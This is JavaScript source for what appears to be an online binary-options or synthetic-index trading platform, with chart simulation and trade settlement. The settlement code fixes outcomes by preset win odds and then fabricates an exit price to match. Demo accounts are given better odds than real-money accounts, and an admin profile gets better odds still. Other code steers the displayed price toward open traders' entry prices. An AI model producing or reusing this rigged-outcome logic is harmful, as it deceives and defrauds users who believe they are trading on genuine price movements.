/* ==========================================================================
   CORE ENGINE - CALCUL STOCHASTIQUE SCELLÉ DÉFINITIF - NE PAS MODIFIER
   ========================================================================== */
(function (root) {
  'use strict';

  var D6 = root.D6 = root.D6 || {};

  var StochasticCore = (function () {
    var SEALED = Object.freeze({
      SIGMA: 0.00125,
      DEFAULT_ODDS: 1.88,
      WIN_P_REAL: Object.freeze({ '1.88': 0.42, '6': 0.12, '11': 0.05, '51': 0.015 }),
      WIN_P_DEMO: Object.freeze({ '1.88': 0.55, '6': 0.157, '11': 0.065, '51': 0.020 }),
      WIN_P_ADMIN_REAL: Object.freeze({ '1.88': 0.70, '6': 0.255, '11': 0.127, '51': 0.02 }),
      PROFIT_PCT: Object.freeze({ '1.88': 88, '6': 500, '11': 1000, '51': 5000 })
    });

    function boxMuller() {
      var u = 0;
      var v = 0;
      while (!(u > 0 && u < 1)) u = Math.random();
      while (!(v > 0 && v < 1)) v = Math.random();
      return Math.sqrt(-2 * Math.log(u)) * Math.cos(2 * Math.PI * v);
    }

    function invNorm(p) {
      var a1 = -3.969683028665376e+01;
      var a2 = 2.209460984245205e+02;
      var a3 = -2.759285104469687e+02;
      var a4 = 1.383577509590705e+02;
      var a5 = -3.066479806614716e+01;
      var a6 = 2.506628277459239e+00;
      var b1 = -5.447609879822406e+01;
      var b2 = 1.615858368580409e+02;
      var b3 = -1.556989798598866e+02;
      var b4 = 6.680131188771972e+01;
      var b5 = -1.328068155288572e+01;
      var c1 = -7.784894002430293e-03;
      var c2 = -3.223964580411365e-01;
      var c3 = -2.400758277161838e+00;
      var c4 = -2.549732539343734e+00;
      var c5 = 4.374664141464968e+00;
      var c6 = 2.938163982698783e+00;
      var d1 = 7.784695709041462e-03;
      var d2 = 3.224671290700398e-01;
      var d3 = 2.445134137142996e+00;
      var d4 = 3.754408661907416e+00;
      var plow = 0.02425;
      var phigh = 1 - plow;
      var q;
      var r;
      if (!(p > 0) || p >= 1) {
        if (p <= 0) return -8;
        return 8;
      }
      if (p < plow) {
        q = Math.sqrt(-2 * Math.log(p));
        return (((((c1 * q + c2) * q + c3) * q + c4) * q + c5) * q + c6) /
          ((((d1 * q + d2) * q + d3) * q + d4) * q + 1);
      }
      if (phigh < p) {
        q = Math.sqrt(-2 * Math.log(1 - p));
        return -(((((c1 * q + c2) * q + c3) * q + c4) * q + c5) * q + c6) /
          ((((d1 * q + d2) * q + d3) * q + d4) * q + 1);
      }
      q = p - 0.5;
      r = q * q;
      return (((((a1 * r + a2) * r + a3) * r + a4) * r + a5) * r + a6) * q /
        (((((b1 * r + b2) * r + b3) * r + b4) * r + b5) * r + 1);
    }

    function oddsKey(mult) {
      var n = Number(mult);
      if (Math.abs(n - 1.88) < 0.001) return '1.88';
      if (Math.abs(n - 6) < 0.001) return '6';
      if (Math.abs(n - 11) < 0.001) return '11';
      if (n >= 50) return '51';
      return '1.88';
    }

    function winProb(payout, profile) {
      var map = SEALED.WIN_P_REAL;
      if (profile === 'demo') map = SEALED.WIN_P_DEMO;
      else if (profile === 'admin') map = SEALED.WIN_P_ADMIN_REAL;
      var p = Number(map[oddsKey(payout)]);
      if (!isFinite(p) || p <= 0 || p >= 1) return 0.42;
      return p;
    }

    function profitPct(payout) {
      var pct = Number(SEALED.PROFIT_PCT[oddsKey(payout)]);
      if (!isFinite(pct) || pct <= 0) return 88;
      return pct;
    }

    function gbmPrice(S0, dt, mu, sigma, z) {
      var s = Number(S0);
      if (!(s > 0) || !isFinite(s)) s = 1;
      var t = Number(dt);
      if (!(t > 0) || !isFinite(t)) t = 1;
      var sig = Number(sigma);
      if (!(sig > 0) || !isFinite(sig)) sig = SEALED.SIGMA;
      var m = Number(mu);
      if (!isFinite(m)) m = 0;
      var zz = Number(z);
      if (!isFinite(zz)) zz = 0;
      var st = s * Math.exp((m - 0.5 * sig * sig) * t + sig * Math.sqrt(t) * zz);
      if (!isFinite(st) || st <= 0) return s;
      return st;
    }

    function driftForSide(side, pWin, sigma, dt) {
      var sig = Number(sigma);
      if (!(sig > 0) || !isFinite(sig)) sig = SEALED.SIGMA;
      var t = Number(dt);
      if (!(t > 0) || !isFinite(t)) t = 1;
      var zP = side === 'put' ? invNorm(1 - pWin) : invNorm(pWin);
      if (!isFinite(zP)) zP = 0;
      return 0.5 * sig * sig + zP * sig / Math.sqrt(t);
    }

    function round2(n) {
      return Math.round(Number(n) * 100) / 100;
    }

    function settle(args) {
      var entry = Number(args && args.entryPrice);
      if (!(entry > 0) || !isFinite(entry)) entry = 1000;
      var dt = Number(args && args.durationSec);
      if (!(dt > 0) || !isFinite(dt)) dt = 5;
      var side = (args && args.side) === 'put' ? 'put' : 'call';
      var payout = (args && args.payout) != null ? args.payout : SEALED.DEFAULT_ODDS;
      var profile = (args && args.profile) || 'real';
      var p = winProb(payout, profile);
      if (!(p > 0) || !isFinite(p)) p = profile === 'demo' ? 0.55 : 0.42;
      if (p >= 1) p = 0.99;
      var won = Math.random() < p;
      var voided = false;
      var nudge = Math.max(entry * 0.00025, 0.02);
      var up = side === 'put' ? !won : won;
      var st = round2(entry + (up ? nudge : -nudge));
      entry = round2(entry);
      if (st === entry) st = round2(entry + (up ? 0.05 : -0.05));
      if (!(st > 0) || !isFinite(st)) {
        st = round2(entry + (up ? 0.05 : -0.05));
      }
      return Object.freeze({
        exitPrice: st,
        won: !!won,
        voided: voided
      });
    }

    return Object.freeze({
      SEALED: SEALED,
      boxMuller: boxMuller,
      invNorm: invNorm,
      gbmPrice: gbmPrice,
      winProb: winProb,
      profitPct: profitPct,
      settle: settle,
      oddsKey: oddsKey,
      round2: round2
    });
  })();

  if (typeof module !== 'undefined' && module.exports && typeof window === 'undefined') {
    module.exports = StochasticCore;
    return;
  }

  var C = D6.CONFIG;
  var markets = {};
  var trades = [];
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;
      // Max simultané très élevé : pas de blocage à 2 trades.
  var MAX_OPEN = (C.MAX_OPEN != null ? C.MAX_OPEN : 10);
  var CANDLE_MS = 1000;
  var HISTORY_SEC = 720;
  var HISTORY_N = 800;
  var SEED_N = 720;
  var synthCache = {};
  var tradeTimers = {};
  var pendingBusyUntil = {};
  var clickQuietUntil = {};
  var hedgeWinBucket = {};

  function u32(n) {
    n = Math.imul(n ^ (n >>> 16), 2246822507);
    n = Math.imul(n ^ (n >>> 13), 3266489909);
    return (n ^ (n >>> 16)) >>> 0;
  }

  function uhash01(i, salt) {
    return u32(Math.imul(i | 0, 374761393) ^ Math.imul(salt | 0, 668265263)) / 4294967296;
  }

  function valueNoise(t, salt) {
    var i = Math.floor(t);
    var f = t - i;
    var u = f * f * (3 - 2 * f);
    return uhash01(i, salt) * (1 - u) + uhash01(i + 1, salt) * u;
  }

  function canonAssetId(id) {
    if (id === 'boom300' || id === 'pulseai') return C.ASSETS.titanpulse ? 'titanpulse' : 'v100';
    return C.ASSETS[id] ? id : 'v100';
  }

  // Profils indépendants : seed + vol + dérive + spikes (pas le même tableau + offset).
  function feedProfile(assetId) {
    switch (assetId) {
      case 'stable':
        return { salt: 221713, vol: 0.09, drift: 0, f1: 0.011, f2: 0.023, f3: 0.005, a1: 3.2, a2: 1.8, a3: 4.2, spike: null, stair: null };
      case 'v75':
        return { salt: 551903, vol: 0.92, drift: 0, f1: 0.088, f2: 0.17, f3: 0.041, a1: 16, a2: 11, a3: 24, spike: null, stair: null };
      case 'crash300':
        return { salt: 771001, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'crash' };
      case 'boomspike':
        return { salt: 882119, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'boom' };
      case 'apex500':
        return { salt: 440501, vol: 1, drift: 0, kind: 'apex' };
      case 'horizon50':
        return { salt: 550050, vol: 1, drift: 0, kind: 'horizon' };
      case 'goldtrend':
        return { salt: 660160, vol: 1, drift: 0, kind: 'gold' };
      case 'nexusprime':
        return { salt: 770870, vol: 1, drift: 0, kind: 'nexus' };
      case 'titanpulse':
        return { salt: 991177, vol: 1, drift: 0, kind: 'titan' };
      case 'v100':
      default:
        return { salt: 904177, vol: 1.05, drift: 0, f1: 0.041, f2: 0.093, f3: 0.017, a1: 18, a2: 11, a3: 32, spike: null, stair: null };
    }
  }

  var TICK_PCT = 0.0022;
  var JUMP_PCT = 0.004;

  function clampIndexPrice(p, asset) {
    var n = Number(p);
    var base = Number(asset && asset.basePrice) || 5000;
    if (!isFinite(n) || n <= 0) n = base;
    var id = asset && asset.id;
    var loMul = 0.88;
    var hiMul = 1.12;
    if (id === 'boomspike' || id === 'crash300') {
      loMul = 0.78;
      hiMul = 1.22;
    }
    // Bandes élargies : sans ça les actifs très volatils collent à leurs bornes.
    if (id === 'titanpulse') {
      loMul = 0.42;
      hiMul = 1.58;
    } else if (id === 'goldtrend') {
      loMul = 0.50;
      hiMul = 1.50;
    } else if (id === 'apex500') {
      loMul = 0.60;
      hiMul = 1.40;
    }
    return Math.round(Math.max(base * loMul, Math.min(base * hiMul, n)) * 100) / 100;
  }

  function isPlausiblePrice(p, ref) {
    var n = Number(p);
    if (!isFinite(n) || n <= 0 || n > 1e7) return false;
    var r = Number(ref);
    if (!(r > 0)) return true;
    if (n > r * 1.12 || n < r * 0.88) return false;
    return true;
  }

  function tickCapPct(asset, spiked) {
    var id = asset && asset.id;
    if (spiked && id === 'crash300') return 0.018;
    if (spiked && id === 'boomspike') return 0.004;
    if (id === 'crash300') return 0.00055;
    if (id === 'stable') return 0.0008;
    if (id === 'horizon50') return 0.0009;
    // Le plafond par pas est la vraie contrainte : il monte avec la volatilité,
    // sinon relever `vol` seul ne change rien au rendu.
    if (id === 'titanpulse') return 0.0410;
    if (id === 'goldtrend') return 0.0212;
    if (id === 'apex500') return 0.0146;
    if (id === 'boomspike') return 0.004;
    if (id === 'nexusprime' || id === 'v75') return 0.0025;
    return 0.002;
  }

  function tradeBusyFor(assetId) {
    var now = Date.now();
    if (pendingBusyUntil[assetId] && pendingBusyUntil[assetId] > now) return true;
    var st = window.assetsState && window.assetsState[assetId];
    if (st && st.lockUntil > now) return true;
    var i;
    for (i = 0; i < trades.length; i++) {
      var tr = trades[i];
      if (!tr || tr.assetId !== assetId) continue;
      var exp = tr.expiryTime || tr.expiresAt || 0;
      if (tr.settled) {
        if (exp && now < exp + 1000) return true;
        continue;
      }
      if (!exp || now < exp + 1000) return true;
    }
    return false;
  }

  function tradeBoxFor(assetId, price) {
    var st = window.assetsState && window.assetsState[assetId];
    var lo;
    var hi;
    if (st && st.lockMax > st.lockMin) {
      lo = st.lockMin;
      hi = st.lockMax;
    } else {
      var p = Number(price);
      if (!(p > 0)) p = 10000;
      lo = p * 0.994;
      hi = p * 1.006;
    }
    var span = hi - lo;
    var pad = span * 0.08;
    return { lo: lo + pad, hi: hi - pad, span: span, frameLo: lo, frameHi: hi };
  }

  function clampToTradeBox(price, box) {
    if (!box) return price;
    if (price > box.hi) return box.hi;
    if (price < box.lo) return box.lo;
    return price;
  }

  function engineCaptureFrame(assetId, untilMs) {
    window.assetsState = window.assetsState || {};
    if (!window.assetsState[assetId]) {
      window.assetsState[assetId] = { viewMin: 0, viewMax: 0, lockMin: 0, lockMax: 0, lockUntil: 0 };
    }
    if (D6.Chart && typeof D6.Chart.captureTradeFrame === 'function') {
      D6.Chart.captureTradeFrame(assetId, untilMs);
      return;
    }
    var st = window.assetsState[assetId];
    if (st.lockMax > st.lockMin && st.lockUntil > Date.now()) {
      st.lockUntil = Math.max(st.lockUntil || 0, untilMs);
      return;
    }
    if (st.viewMax > st.viewMin) {
      st.lockMin = st.viewMin;
      st.lockMax = st.viewMax;
    }
    st.lockUntil = untilMs;
  }

  function sanitizeOhlc(asset, candle, refPrice, wickSpan) {
    if (!candle) return candle;
    var ref = Number(refPrice);
    if (!(ref > 0)) ref = Number(candle.c) || Number(asset && asset.basePrice) || 5000;
    var o = clampIndexPrice(candle.o, asset);
    var c = clampIndexPrice(candle.c, asset);
    var h = clampIndexPrice(candle.h, asset);
    var l = clampIndexPrice(candle.l, asset);
    if (!isPlausiblePrice(o, ref)) o = ref;
    if (!isPlausiblePrice(c, ref)) c = ref;
    o = capPctMove(ref, o, 0.03);
    c = capPctMove(ref, c, 0.03);
    h = Math.max(o, c, isPlausiblePrice(h, ref) ? h : c);
    l = Math.min(o, c, isPlausiblePrice(l, ref) ? l : c);
    if (wickSpan > 0) {
      var cap7 = wickSpan * 0.07;
      if ((h - l) > cap7) {
        var mid7 = (h + l) / 2;
        h = mid7 + cap7 / 2;
        l = mid7 - cap7 / 2;
      }
    }
    candle.o = o;
    candle.c = c;
    candle.h = h;
    candle.l = l;
    return candle;
  }

  window.assetBuffers = window.assetBuffers || {};
  window.ASSET_BUFFERS = window.assetBuffers;
  window.assetsHistory = window.assetsHistory || {};

  var SIM = {
    v100: { mode: 'candles', vol: 0.0035, thin: false },
    stable: { mode: 'line', vol: 0.0048, color: '#ff3366', coreWave: true, pullK: 0.05 },
    // Cadence relevée, amplitude tenue : `stepMs` rapproche les pas et `pullK`
    // est remonté dans la même proportion, sinon multiplier les pas gonflerait
    // mécaniquement la hauteur des bougies.
    apex500: { mode: 'candles', vol: 0.0430, stepMs: 34, pullK: 0.100 },
    horizon50: { mode: 'line', vol: 0.0016, color: '#ff9800', horizonCalm: true, tickMs: 200, pullK: 0.03 },
    // Machine à impulsions réactivée : sans `boomBurst`, l'actif n'avait
    // simplement aucune explosion, c'était une marche aléatoire ordinaire.
    boomspike: { mode: 'candles', vol: 0.0088, boomBurst: true },
    crash300: { mode: 'candles', vol: 0.00035, spike: -1, crashCalm: true },
    v75: { mode: 'candles', vol: 0.0048, v75Wave: true, tickMs: 190, stepMs: 50, pullK: 0.075 },
    nexusprime: { mode: 'candles', vol: 0.0058, nexusPulse: true, tickMs: 90 },
    // Rappel vers la moyenne allégé : les vagues partent franchement dans une
    // direction au lieu d'être ramenées au centre à chaque pas.
    goldtrend: { mode: 'line', vol: 0.1120, color: '#ffb300', goldHot: true, tickMs: 40, stepMs: 24, pullK: 0.024 },
    // Titan Pulse : générateur universel de chandeliers, sans formule dédiée.
    // La cadence la plus rapide de la plateforme.
    titanpulse: { mode: 'candles', vol: 0.0760, stepMs: 16, pullK: 0.075, wickK: 0.38 },
  };
  var SIM_VER = 20;
  var BOOM_VER = 7;
  var CRASH_VER = 2;
  var GOLD_VER = 4;
  var MIN_SEED = 500;
  // Bump obligatoire : c'est lui qui force le re-seed de tous les actifs.
  var SCALE_VER = 13;
  Object.keys(SIM).forEach(function (sid) {
    if (SIM[sid] && typeof SIM[sid] === 'object') Object.freeze(SIM[sid]);
  });
  Object.freeze(SIM);

  function simOf(id) {
    return SIM[id] || SIM.v100;
  }

  function candleMsFor(asset) {
    return CANDLE_MS;
  }

  function capPctMove(prev, next, maxPct) {
    if (!isFinite(next)) return prev;
    if (!(prev > 0)) return isFinite(next) && next > 0 ? next : prev;
    var lo = prev * (1 - maxPct);
    var hi = prev * (1 + maxPct);
    if (next < lo) return lo;
    if (next > hi) return hi;
    return next;
  }

  function stepBoomBurst(asset, buf, price, tMs) {
    var from = price;
    var marked = false;
    if (!buf.boomPhase) {
      buf.boomPhase = 'acc';
      // Intervalles resserrés de 40 % : les explosions s'enchaînent plus vite.
      buf.boomPhaseUntil = tMs + 1800 + Math.random() * 1800;
      buf.boomMid = price;
      buf.boomLeft = 0;
      buf.boomZig = 1;
    }
    if (buf.boomPhase === 'acc') {
      var mid = buf.boomMid || price;
      var n = (Math.random() - 0.5) * mid * 0.0017;
      var w = Math.sin(tMs / 55) * mid * 0.00055;
      price = clampIndexPrice(mid + n + w, asset);
      buf.boomMid = mid * 1.00005;
      if (tMs >= (buf.boomPhaseUntil || 0)) {
        buf.boomPhase = 'burst';
        buf.boomLeft = 2 + (Math.random() > 0.5 ? 1 : 0);
        buf.boomZig = 1;
      }
    } else if (buf.boomPhase === 'burst') {
      if (buf.boomZig === 1 && buf.boomLeft > 0) {
        price = clampIndexPrice(from * (1 + 0.018 + Math.random() * 0.016), asset);
        buf.boomPeak = price;
        buf.boomZig = -1;
        buf.boomLeft -= 1;
        marked = true;
      } else if (buf.boomZig === -1 && buf.boomLeft > 0) {
        price = clampIndexPrice(from * (1 - 0.005 - Math.random() * 0.007), asset);
        buf.boomZig = 1;
        marked = true;
      } else {
        buf.boomPhase = 'relax';
        buf.boomPhaseUntil = tMs + 1680 + Math.random() * 1320;
      }
    }
    if (buf.boomPhase === 'relax') {
      var peak = buf.boomPeak || price;
      var floor = peak * 0.91;
      var pull = (floor - price) * 0.07;
      var spanB = Math.max(peak - floor, price * 0.008);
      var bounce = (Math.random() - 0.48) * spanB * (0.20 + Math.random() * 0.10);
      var jit = (Math.random() - 0.5) * price * 0.0045;
      price = clampIndexPrice(price + pull + bounce + jit, asset);
      if (tMs >= (buf.boomPhaseUntil || 0)) {
        buf.boomPhase = 'acc';
        buf.boomPhaseUntil = tMs + 1800 + Math.random() * 1800;
        buf.boomMid = price;
      }
    }
    return { price: capPctMove(from, price, JUMP_PCT), boom: marked, from: from };
  }

  function unifiedStep(asset, price, nowMs, dtSec, opts) {
    opts = opts || {};
    var prevPrice = price;
    var busyIn = !!(opts.busy || (asset && tradeBusyFor(asset.id)));
    opts.spike = false;
    var sim = simOf(asset.id);
    var base = Number(asset.basePrice) || price;
    var vol = sim.vol;
    var bias = busyIn ? 0.5 : 0.49;
    if (!busyIn && sim.spike === 1) bias = 0.58;
    if (!busyIn && sim.spike === -1) bias = 0.40;
    if (sim.pulse) {
      var phP = ((nowMs / 1000) % 16) / 16;
      vol *= phP < 0.78 ? 0.42 : 1.9;
    }
    var roll = sim.crashCalm ? 0.5 : (opts.det != null ? uhash01(opts.det, 904177) : Math.random());
    var nextOut;
    if (opts.hunt > 0 && !busyIn) {
      var gapH = opts.hunt - price;
      var nH = (roll - 0.5) * price * 0.0036;
      var wH = Math.sin(nowMs / 110) * price * 0.0017 + Math.sin(nowMs / 47) * price * 0.0009;
      var teaseH = Math.sin(nowMs / 310) * (Math.abs(gapH) + price * 0.0016) * 0.58;
      nextOut = price + gapH * 0.055 + nH + wH + teaseH;
    } else if (sim.crashCalm && !opts.spike) {
      // Montée calme : une pente unique par bougie, proportionnelle au temps écoulé.
      // L'ancienne cadence de 250 ms ne tombait pas sur le pas de 200 ms et faisait
      // vibrer la pente à haute fréquence.
      var riseC = 0.0011 + uhash01(Math.floor(nowMs / CANDLE_MS), 771001) * 0.0007;
      nextOut = price + price * riseC * Math.min(0.6, Math.max(0.03, dtSec));
    } else if (sim.coreWave && !opts.spike) {
      var zigC = (roll - 0.5) * price * vol * 1.35;
      var waveC = Math.sin(nowMs / 190) * price * 0.00072;
      var zig2C = Math.sin(nowMs / 73) * price * 0.00038;
      var pullC = busyIn ? 0 : (base - price) * (sim.pullK != null ? sim.pullK : 0.05);
      nextOut = price + zigC + waveC + zig2C + pullC;
    } else if (sim.goldHot && !opts.spike) {
      var nG = (roll - 0.5) * price * vol;
      var p1G = Math.sin(nowMs / 1000 * Math.PI * 14) * price * 0.002875;
      var p2G = Math.sin(nowMs / 1000 * Math.PI * 29.5) * price * 0.001375;
      var microG = ((roll - 0.5) * 2) * price * 0.0055;
      if (!busyIn && roll > 0.72) microG += ((roll - 0.72) / 0.28 - 0.5) * price * 0.01625;
      var pullG = busyIn ? 0 : (base - price) * (sim.pullK != null ? sim.pullK : 0.028);
      nextOut = price + nG + p1G + p2G + microG + pullG;
    } else if (sim.nexusPulse && !opts.spike) {
      var nN = (roll - 0.5) * price * vol;
      var pN = Math.sin(nowMs / 1000 * Math.PI * 8.5) * price * 0.00038;
      var qN = Math.sin(nowMs / 1000 * Math.PI * 19) * price * 0.00016;
      var pullN = busyIn ? 0 : (base - price) * 0.045;
      nextOut = price + nN + pN + qN + pullN;
    } else if (sim.horizonCalm && !opts.spike) {
      // Horizon 50 : l'actif le plus posé du lot. Bruit réduit et deux houles
      // lentes, sans à-coup, pour un tracé régulier.
      var nHz = (roll - 0.5) * price * vol * 0.5;
      var w1Hz = Math.sin(nowMs / 1000 * Math.PI * 0.85) * price * 0.00038;
      var w2Hz = Math.sin(nowMs / 1000 * Math.PI * 2.1) * price * 0.00014;
      var pullHz = busyIn ? 0 : (base - price) * (sim.pullK != null ? sim.pullK : 0.03);
      nextOut = price + nHz + w1Hz + w2Hz + pullHz;
    } else if (sim.v75Wave && !opts.spike) {
      var nV = (roll - 0.5) * price * vol;
      var pV = Math.sin(nowMs / 1000 * Math.PI * 5.6) * price * 0.00062;
      var qV = Math.sin(nowMs / 1000 * Math.PI * 13.2) * price * 0.00028;
      var rV = Math.sin(nowMs / 1000 * Math.PI * 2.1) * price * 0.00018;
      var pullV = busyIn ? 0 : (base - price) * (sim.pullK != null ? sim.pullK : 0.038);
      nextOut = price + nV + pV + qV + rV + pullV;
    } else {
      var center = bias;
      var delta = (roll - center) * price * vol;
      if (sim.sine) delta += Math.sin(nowMs / 1000 * Math.PI / 20) * price * 0.00085;
      if (sim.stair && !busyIn) {
        var stS = (nowMs / 1000) % 9;
        if (stS < 5.5) delta += Math.abs(price) * 0.00045 * Math.max(dtSec, 0.05);
        else delta *= 0.12;
      }
      nextOut = price + delta + (busyIn ? 0 : (base - price) * (sim.pullK != null ? sim.pullK : 0.04));
    }
    var stepCap = tickCapPct(asset, !!opts.spike);
    nextOut = capPctMove(prevPrice, nextOut, stepCap);
    return clampIndexPrice(nextOut, asset);
  }

  function finishCandle(asset, o, h, l, c, t, spike) {
    var sim = simOf(asset.id);
    o = clampIndexPrice(o, asset);
    c = clampIndexPrice(c, asset);
    var minBody = Math.max(Math.abs(o) * 0.0002, 0.02);
    var cms = candleMsFor(asset);
    var bucket = Math.floor(t / cms);
    if (!spike) {
      if (sim.run) {
        var run = 4 + Math.floor(uhash01(Math.floor(bucket / 8), 440501) * 3);
        var pos = bucket % (run + 3);
        if (pos < run) c = o + Math.max(minBody, Math.abs(c - o));
        else c = o - Math.max(minBody * 0.7, Math.abs(c - o) * 0.55);
      } else if (sim.nexusPulse) {
        var ampN = Math.max(Math.abs(o) * 0.0009, 0.12);
        var maxN = Math.abs(o) * 0.012;
        if (c >= o) c = o + Math.min(maxN, Math.max(ampN, Math.abs(c - o)));
        else c = o - Math.min(maxN, Math.max(ampN, Math.abs(c - o)));
      } else if (sim.v75Wave) {
        var ampV = Math.max(Math.abs(o) * 0.00085, 0.12);
        var maxV = Math.abs(o) * 0.012;
        if (c >= o) c = o + Math.min(maxV, Math.max(ampV, Math.abs(c - o)));
        else c = o - Math.min(maxV, Math.max(ampV, Math.abs(c - o)));
      } else if (sim.horizonCalm) {
        var ampHz = Math.max(Math.abs(o) * 0.00035, 0.05);
        var maxHz = Math.abs(o) * 0.0022;
        if (c >= o) c = o + Math.min(maxHz, Math.max(ampHz, Math.abs(c - o)));
        else c = o - Math.min(maxHz, Math.max(ampHz, Math.abs(c - o)));
      } else if (sim.boomBurst) {
        // Corps de phase calme lisibles : à 0.00014 les bougies hors explosion
        // se réduisaient à des points invisibles.
        var tinyB = Math.max(Math.abs(o) * 0.0007, 0.05);
        c = c >= o ? o + tinyB : o - tinyB;
      } else if (sim.spike === 1) {
        c = o - Math.max(minBody, Math.abs(c - o) * 0.65);
      } else if (sim.crashCalm) {
        c = Math.max(c, o);
      } else if (sim.spike === -1) {
        c = o + Math.max(minBody, Math.abs(c - o) * 0.65);
      } else if (Math.abs(c - o) < minBody) {
        c = o + (c >= o ? minBody : -minBody);
      }
    }
    h = Math.max(h, o, c);
    l = Math.min(l, o, c);
    if (!sim.boomBurst && sim.spike !== -1 && sim.spike !== 1) {
      h = capPctMove(o, h, JUMP_PCT);
      l = capPctMove(o, l, JUMP_PCT);
      h = Math.max(h, o, c);
      l = Math.min(l, o, c);
    }
    var body = Math.abs(c - o);
    var maxW = body * (sim.wickK != null ? sim.wickK : 1.2);
    if (sim.boomBurst) maxW = spike ? body * 0.12 : body * 0.35;
    if (sim.crashCalm) maxW = Math.max(Math.abs(o) * 0.00008, 0.01);
    if (sim.nexusPulse) maxW = body * 0.95;
    if (sim.v75Wave) maxW = Math.max(body * 0.9, Math.abs(o) * 0.00035);
    if (sim.horizonCalm) maxW = Math.max(body * 0.5, Math.abs(o) * 0.00012);
    var hiB = Math.max(o, c);
    var loB = Math.min(o, c);
    if (h > hiB + maxW) h = hiB + maxW;
    if (l < loB - maxW) l = loB - maxW;
    return {
      o: clampIndexPrice(o, asset),
      h: clampIndexPrice(h, asset),
      l: clampIndexPrice(l, asset),
      c: clampIndexPrice(c, asset),
      t: t,
      _spike: !!spike,
      _boom: !!(sim.boomBurst && spike)
    };
  }

  function bindGlobalBuffers() {
    window.assetBuffers = window.assetBuffers || {};
    window.ASSET_BUFFERS = window.assetBuffers;
    window.assetsHistory = window.assetsHistory || {};
  }

  function stitchCandle(asset, prevClose, candle, maxPct) {
    maxPct = maxPct || JUMP_PCT;
    if (!(prevClose > 0) || !candle) return prevClose;
    var o = capPctMove(prevClose, Number(candle.o) || prevClose, maxPct);
    var c = capPctMove(o, Number(candle.c) || o, maxPct);
    c = capPctMove(prevClose, c, maxPct);
    var h = Math.max(o, c, capPctMove(prevClose, Number(candle.h) || c, maxPct));
    var l = Math.min(o, c, capPctMove(prevClose, Number(candle.l) || c, maxPct));
    candle.o = clampIndexPrice(o, asset);
    candle.c = clampIndexPrice(c, asset);
    candle.h = clampIndexPrice(Math.max(h, candle.o, candle.c), asset);
    candle.l = clampIndexPrice(Math.min(l, candle.o, candle.c), asset);
    return candle.c;
  }

  function sanitizeBuffer(asset, buf) {
    if (buf) buf.scaleVer = SCALE_VER;
    return buf;
  }

  function rebaseBufferTimes(buf, nowMs) {
    if (!buf || !buf.candles || !buf.candles.length) return false;
    var cms = CANDLE_MS;
    var n = buf.candles.length;
    var formingStart = Math.floor((nowMs || Date.now()) / cms) * cms;
    var tEnd = formingStart - cms;
    var last = buf.candles[n - 1];
    if (last && isFinite(last.t) && Math.abs(last.t - tEnd) <= cms) {
      if (buf.forming && !isFinite(buf.forming.t)) {
        buf.forming.t = formingStart;
        return true;
      }
      return false;
    }
    var i;
    for (i = 0; i < n; i++) {
      buf.candles[i].t = tEnd - (n - 1 - i) * cms;
    }
    buf.bucket = Math.floor(formingStart / cms);
    if (buf.forming) buf.forming.t = formingStart;
    return true;
  }

  function publishHistory(assetId, buf) {
    bindGlobalBuffers();
    if (buf.prices && buf.prices.length > HISTORY_N) buf.prices = buf.prices.slice(-HISTORY_N);
    window.assetsHistory[assetId] = buf.prices || [];
    window.assetBuffers[assetId] = buf;
    window.ASSET_BUFFERS[assetId] = buf;
  }

  function huntPriceFor(assetId) {
    var i;
    var now = Date.now();
    for (i = 0; i < trades.length; i++) {
      var tr = trades[i];
      if (!tr || tr.settled || tr.assetId !== assetId) continue;
      var exp = tr.expiryTime || tr.expiresAt || 0;
      if (exp && now >= exp) continue;
      var ep = Number(tr.entryPrice);
      var ref = 0;
      if (window.assetBuffers && window.assetBuffers[assetId] && window.assetBuffers[assetId].price) {
        ref = window.assetBuffers[assetId].price;
      } else if (markets[assetId] && markets[assetId].price) {
        ref = markets[assetId].price;
      }
      if (isPlausiblePrice(ep, ref)) return ep;
    }
    return 0;
  }

  function makeWalkCandle(asset, prev, ts, i) {
    var sim = simOf(asset.id);
    var base = Number(asset.basePrice) || prev;
    var vol = Math.max(prev * (sim.vol || 0.0035), prev * 0.0014);
    if (sim.crashCalm) vol = prev * 0.00032;
    var rnd = uhash01(i + 3, sim.vol * 1000 || 11) - 0.49;
    var close = prev + rnd * vol * 2.6;
    close += (base - close) * 0.028;
    var spiked = false;
    if (sim.crashCalm) {
      close = prev + prev * (0.00022 + uhash01(i, 11) * 0.00028);
      if (i > 8 && (i % 18) === 0) {
        close = prev * 0.982;
        spiked = true;
      }
    } else if (sim.spike === -1 && i > 6 && (i % (16 + Math.floor(uhash01(i, 19) * 12))) === 0) {
      close = prev * (1 - 0.015 - uhash01(i, 4) * 0.012);
      spiked = true;
    } else if (sim.run) {
      var run = 4 + Math.floor(uhash01(Math.floor(i / 8), 440501) * 3);
      var pos = i % (run + 3);
      close = pos < run ? prev + vol * 1.05 : prev - vol * 0.62;
    }
    close = clampIndexPrice(close, asset);
    var open = prev;
    var wick = vol * (0.4 + uhash01(i, 22) * 0.85);
    var h = Math.max(open, close) + wick * uhash01(i, 7);
    var l = Math.min(open, close) - wick * uhash01(i, 8);
    if (sim.crashCalm) {
      wick = prev * 0.00006;
      h = Math.max(open, close) + wick;
      l = Math.min(open, close) - wick;
    }
    // Mèches bornées au corps, comme dans finishCandle : sans ça l'historique
    // amorcé garderait des mèches calculées sur la volatilité seule.
    if (sim.wickK != null) {
      var bodyW = Math.abs(close - open);
      var capW = bodyW * sim.wickK;
      var hiW = Math.max(open, close);
      var loW = Math.min(open, close);
      if (h > hiW + capW) h = hiW + capW;
      if (l < loW - capW) l = loW - capW;
    }
    if (spiked) l = Math.min(l, close);
    return {
      o: clampIndexPrice(open, asset),
      h: clampIndexPrice(h, asset),
      l: clampIndexPrice(l, asset),
      c: close,
      t: ts,
      _spike: spiked,
      _boom: false
    };
  }

  function seedAssetBuffer(asset) {
    var sim = simOf(asset.id);
    var price = Number(asset.basePrice) || 5000;
    var now = Date.now();
    var cms = candleMsFor(asset);
    var t0 = Math.floor(now / cms) - SEED_N;
    var candles = [];
    var prices = [];
    var i;
    var k;
    var nextSpike;
    if (sim.crashCalm) nextSpike = now + 18000;
    else nextSpike = now + 25000 + Math.random() * 10000;
